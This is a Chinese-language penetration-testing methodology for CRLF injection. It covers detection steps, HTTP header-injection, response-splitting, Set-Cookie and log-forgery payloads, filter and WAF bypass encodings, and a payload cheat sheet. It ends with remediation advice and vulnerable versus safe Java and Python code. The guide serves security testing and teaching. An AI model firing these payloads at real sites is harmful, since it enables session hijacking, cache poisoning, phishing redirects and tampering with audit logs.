# CRLF 注入攻击方法论

---

# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化的 CRLF（Carriage Return Line Feed）注入漏洞检测与利用流程，帮助发现和利用 HTTP 头注入、日志注入等相关漏洞。

## 1.2 适用范围

本文档适用于所有接收用户输入并将其写入 HTTP 响应头、日志文件或重定向位置的 Web 应用。

## 1.3 读者对象

本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 2.1 技术介绍

### 漏洞原理

CRLF 注入是指攻击者向应用程序注入回车符（CR, `%0d`, `\r`）和换行符（LF, `%0a`, `\n`）字符序列，从而：
1. 在 HTTP 响应中注入恶意头部
2. 进行 HTTP 响应拆分攻击
3. 污染日志文件（日志注入）
4. 绕过基于行的安全控制

**本质问题**：用户输入中的 CRLF 字符未被过滤就被写入 HTTP 头部或日志文件。

### 常见 CWE 映射

| CWE 编号 | 描述 |
|---------|------|
| CWE-93 | CRLF 注入 |
| CWE-113 | HTTP 响应拆分 |
| CWE-116 | 输出编码不足 |

### CRLF 字符表示

| 表示方式 | 编码 | 说明 |
|---------|------|------|
| `\r\n` | `%0d%0a` | Windows 风格 |
| `\n` | `%0a` | Unix/Linux 风格 |
| `\r` | `%0d` | Mac 风格 (旧) |
| `%5C%72%5C%6E` | 双重 URL 编码 | 绕过过滤 |

## 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 重定向功能 | URL 重定向、登录后跳转 | Location 头注入 |
| 自定义头部 | X-User-Id、X-Forwarded-For | 任意头部注入 |
| Cookie 设置 | 会话管理、用户跟踪 | Set-Cookie 注入 |
| 日志记录 | 访问日志、错误日志 | 日志伪造/注入 |
| 文件下载 | Content-Disposition 头 | 文件名注入 |
| 缓存控制 | Cache-Control、Expires | 缓存策略注入 |
| CORS 配置 | Access-Control-Allow-Origin | CORS 策略注入 |

## 2.3 漏洞发现方法

### 2.3.1 黑盒测试

**步骤 1：输入点识别**

识别所有可能写入 HTTP 头部的输入点：
- URL 参数（尤其是 redirect_url、next、return 等）
- HTTP 请求头（User-Agent、Referer、X-Forwarded-For）
- Cookie 值
- POST 数据

**步骤 2：基础探测**

```http
# 测试 Location 头注入
GET /redirect?url=http://example.com%0d%0aX-Injected:header HTTP/1.1

# 测试 Set-Cookie 注入
GET /login?user=admin%0d%0aSet-Cookie:admin=true HTTP/1.1

# 测试自定义头部注入
GET /page?lang=en%0d%0aX-XSS-Protection:0 HTTP/1.1

# 测试 User-Agent 注入
GET / HTTP/1.1
User-Agent: Mozilla/5.0%0d%0aX-Injected:header

# 测试 Referer 注入
GET / HTTP/1.1
Referer: http://example.com%0d%0aX-Injected:header
```

**步骤 3：响应分析**

检查响应中是否包含注入的头部：
```bash
# 使用 curl 查看完整响应头
curl -v "http://target.com/redirect?url=http://example.com%0d%0aX-Injected:header"

# 使用 Burp Suite 查看原始响应
```

### 2.3.2 日志注入检测

**步骤 1：识别日志记录点**

- 访问日志
- 错误日志
- 审计日志
- 应用日志

**步骤 2：注入测试**

```http
# 注入伪造的日志条目
GET /admin%0d%0a192.168.1.1 - - [01/Jan/2024:00:00:00 +0000] "GET /admin HTTP/1.1" 200 1234 HTTP/1.1
User-Agent: Admin%0d%0aFake log entry

# 注入虚假认证成功记录
GET /login?user=admin%0d%0aAuthentication successful for admin from 127.0.0.1
```

**步骤 3：检查日志文件**

如果有日志访问权限，检查注入的内容是否被记录。

### 2.3.3 自动化工具检测

```bash
# 使用 Nuclei 模板
nuclei -t http/crlf-injection.yaml -u http://target.com

# 使用 Burp Suite Scanner
# 主动扫描 CRLF 注入

# 使用自定义脚本
python3 crlf_scanner.py -u http://target.com
```

## 2.4 漏洞利用方法

### 2.4.1 HTTP 头注入

**注入任意头部**

```http
# 注入 X-XSS-Protection 头绕过防护
GET /page?lang=en%0d%0aX-XSS-Protection:0 HTTP/1.1

# 注入 Content-Type 进行 XSS 攻击
GET /page?callback=test%0d%0aContent-Type:text/html HTTP/1.1

# 注入 Refresh 头进行重定向
GET /page?url=home%0d%0aRefresh:0;url=http://attacker.com HTTP/1.1
```

**结合 XSS 攻击**

```http
# 注入 Content-Type 为 text/html 然后注入 XSS
GET /api/data?callback=test%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script> HTTP/1.1

# 注入多个头部
GET /redirect?url=target%0d%0aSet-Cookie:session=attacker%0d%0aContent-Type:text/html HTTP/1.1
```

### 2.4.2 HTTP 响应拆分攻击

**攻击原理**

通过注入 CRLF 字符，攻击者可以：
1. 提前终止当前 HTTP 响应
2. 创建全新的 HTTP 响应
3. 注入恶意内容

**攻击 Payload**

```http
# 基础响应拆分
GET /page?lang=en%0d%0a%0d%0a<html><body><h1>Malicious Content</h1></body></html> HTTP/1.1

# 完整响应拆分示例
GET /redirect?url=http://example.com%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type:text/html%0d%0a%0d%0a<html><body><h1>Injected Response</h1></body></html> HTTP/1.1
```

**攻击场景**

1. **缓存投毒**：注入的响应被代理服务器缓存
2. **钓鱼攻击**：创建伪造的登录页面
3. **恶意软件分发**：注入恶意下载链接

### 2.4.3 Cookie 注入

**注入 Set-Cookie 头**

```http
# 注入管理员 Cookie
GET /login?user=attacker%0d%0aSet-Cookie:is_admin=true;path=/ HTTP/1.1

# 注入会话 Cookie
GET /page?lang=en%0d%0aSet-Cookie:session=ATTACKER_SESSION_ID;path=/ HTTP/1.1

# 注入多个 Cookie
GET /page?id=1%0d%0aSet-Cookie:admin=true%0d%0aSet-Cookie:role=superuser HTTP/1.1
```

**结合其他漏洞**

```http
# Cookie 注入 + XSS
GET /page?data=test%0d%0aSet-Cookie:XSS=payload;path=/ HTTP/1.1

# Cookie 注入 + 缓存投毒
GET /api/data?callback=x%0d%0aSet-Cookie:malicious=value%0d%0aCache-Control:max-age=3600 HTTP/1.1
```

### 2.4.4 日志伪造攻击

**伪造日志条目**

```http
# 伪造管理员访问记录
GET /admin%0d%0a192.168.1.100 - admin [01/Jan/2024:12:00:00 +0000] "GET /admin/config HTTP/1.1" 200 5678

# 伪造认证成功记录
POST /login
username=admin%0d%0a127.0.0.1 - - [01/Jan/2024:12:00:00 +0000] "Authentication successful"
password=test

# 注入虚假错误日志
GET /page?error=%0d%0a[ERROR] Critical security breach detected! Contact admin immediately.
```

**攻击目的**

1. **掩盖攻击痕迹**：删除或混淆真实攻击日志
2. **陷害他人**：伪造来自特定 IP 的访问记录
3. **社会工程**：创建紧急日志条目诱导管理员操作
4. **日志注入攻击**：在基于日志的分析系统中注入恶意数据

### 2.4.5 重定向攻击

**利用 Location 头注入**

```http
# 开放重定向
GET /redirect?url=http://attacker.com%0d%0aX-Injected:header

# 注入多个 Location 头（某些服务器只使用第一个）
GET /redirect?url=http://target.com%0d%0aLocation:http://attacker.com

# 结合 XSS
GET /redirect?url=data:text/html,<script>alert(1)</script>
```

## 2.5 漏洞利用绕过方法

### 2.5.1 过滤绕过

**URL 编码绕过**

```http
# 基础 URL 编码
%0d%0a → \r\n

# 双重 URL 编码
%250d%250a → %0d%0a → \r\n

# Unicode 编码
\u000d\u000a → \r\n

# UTF-8 编码
%E5%98%8A%E5%98%8D → \r\n (某些服务器)
```

**大小写混合**

```http
# 某些过滤器对大小写敏感
%0D%0A
%0d%0A
%0D%0a
```

**替代字符**

```http
# 使用 Unicode 换行符
%E2%80%A8 → Unicode Line Separator
%E2%80%A9 → Unicode Paragraph Separator

# 使用垂直制表符
%0B → Vertical Tab

# 使用换页符
%0C → Form Feed
```

### 2.5.2 WAF 绕过

**分块传输编码**

```http
POST /page HTTP/1.1
Transfer-Encoding: chunked

5
lang=
7
en%0d%0aX
1
-
5
Injected
0
```

**HTTP 参数污染**

```http
# 发送多个同名参数
GET /page?lang=en&lang=%0d%0aX-Injected:header

# 使用数组语法
GET /page?lang[]=en&lang[]=%0d%0aX-Injected:header
```

**编码链绕过**

```http
# 多层编码
原始：\r\n
URL 编码：%0d%0a
双重编码：%250d%250a
三重编码：%25250d%25250a
```

### 2.5.3 服务器特定绕过

**Apache**

```http
# Apache 对 CRLF 的处理
%0d%0a
%E5%98%8A%E5%98%8D
```

**Nginx**

```http
# Nginx 通常过滤%0d%0a，尝试
%0a
%E5%98%8A
```

**IIS**

```http
# IIS 特定编码
%0d%0a
%250d%250a
```

---

# 第三部分：附录

## 3.1 常用 Payload 速查表

| 类别 | Payload | 说明 |
|-----|---------|------|
| 基础 CRLF | `%0d%0a` | 标准 CRLF |
| Location 注入 | `url=http://x.com%0d%0aX-Injected:header` | 重定向头注入 |
| Set-Cookie 注入 | `user=admin%0d%0aSet-Cookie:admin=true` | Cookie 注入 |
| Content-Type 注入 | `callback=test%0d%0aContent-Type:text/html` | 内容类型注入 |
| 响应拆分 | `url=x%0d%0a%0d%0a<html>Malicious</html>` | 完整响应注入 |
| 日志伪造 | `user=admin%0d%0a127.0.0.1 - - [date] "GET /admin"` | 伪造日志 |
| 双重编码 | `%250d%250a` | 绕过过滤 |

## 3.2 自动化工具

| 工具 | 用途 | 链接 |
|-----|------|------|
| Nuclei | CRLF 注入扫描 | https://github.com/projectdiscovery/nuclei |
| Burp Suite | 手动测试和扫描 | https://portswigger.net/burp |
| OWASP ZAP | 自动化扫描 | https://www.zaproxy.org/ |
| crlfuzz | CRLF 注入专用工具 | https://github.com/dwisiswant0/crlfuzz |

## 3.3 CRLF 注入测试检查清单

```
□ 测试所有重定向参数
□ 测试所有可能写入头部的参数
□ 测试 HTTP 请求头（User-Agent, Referer 等）
□ 测试 Cookie 值
□ 测试日志注入
□ 测试响应拆分
□ 测试编码绕过（URL、双重 URL、Unicode）
□ 测试 WAF 绕过
□ 验证不同服务器行为（Apache/Nginx/IIS）
```

## 3.4 修复建议

1. **输入验证** - 拒绝包含 CRLF 字符的输入
2. **输出编码** - 对写入头部的数据进行编码
3. **使用安全 API** - 使用框架提供的安全头部设置方法
4. **框架更新** - 确保使用最新版本的 Web 框架

### 代码示例

**Java (不安全)**
```java
// ❌ 漏洞代码
String redirectUrl = request.getParameter("url");
response.setHeader("Location", redirectUrl);
```

**Java (安全)**
```java
// ✅ 安全代码
String redirectUrl = request.getParameter("url");
// 验证 URL 是否合法
if (!isValidUrl(redirectUrl)) {
    redirectUrl = "/default";
}
// 过滤 CRLF 字符
redirectUrl = redirectUrl.replaceAll("[\r\n]", "");
response.setHeader("Location", redirectUrl);
```

**Python (不安全)**
```python
# ❌ 漏洞代码
@app.route('/redirect')
def redirect():
    url = request.args.get('url')
    return redirect(url)
```

**Python (安全)**
```python
# ✅ 安全代码
import re

@app.route('/redirect')
def redirect():
    url = request.args.get('url')
    # 过滤 CRLF 字符
    url = re.sub(r'[\r\n]', '', url)
    # 验证 URL 白名单
    if not is_safe_url(url):
        url = '/default'
    return redirect(url)
```

---

**参考资源**：
- [OWASP CRLF Injection](https://owasp.org/www-community/attacks/CRLF_Injection)
- [CWE-113: HTTP Response Splitting](https://cwe.mitre.org/data/definitions/113.html)
- [PortSwigger - HTTP Header Injection](https://portswigger.net/web-security/request-smuggling)
